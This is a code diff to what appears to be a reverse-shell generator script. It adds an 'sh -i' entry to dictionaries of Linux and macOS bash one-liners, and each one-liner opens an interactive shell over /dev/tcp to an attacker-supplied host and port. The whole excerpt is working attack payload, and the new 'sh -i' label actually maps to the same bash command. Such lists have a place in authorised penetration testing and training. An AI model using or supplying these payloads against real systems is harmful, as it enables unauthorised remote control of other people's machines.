@@ -18,6 +18,7 @@ class bcolors:
 reverse_shells = {
     'linux': {
         'bash -i': 'bash -i >& /dev/tcp/{}/{} 0>&1',
+        'sh -i': 'bash -i >& /dev/tcp/{}/{} 0>&1',
         'bash 196': '0<&196;exec 196<>/dev/tcp/{}/{}; sh <&196 >&196 2>&196',
         'bash read line': 'exec 5<>/dev/tcp/{}/{};cat <&5 | while read line; do $line 2>&5 >&5; done',
         'bash 5': 'bash -i 5<> /dev/tcp/{}/{} 0<&5 1>&5 2>&5',
@@ -38,6 +39,7 @@ reverse_shells = {
     },
     'macos': {
         'bash -i': 'bash -i >& /dev/tcp/{}/{} 0>&1',
+        'sh -i': 'bash -i >& /dev/tcp/{}/{} 0>&1',
         'bash 196': '0<&196;exec 196<>/dev/tcp/{}/{}; sh <&196 >&196 2>&196',
         'bash read line': 'exec 5<>/dev/tcp/{}/{};cat <&5 | while read line; do $line 2>&5 >&5; done',
         'bash 5': 'bash -i 5<> /dev/tcp/{}/{} 0<&5 1>&5 2>&5',
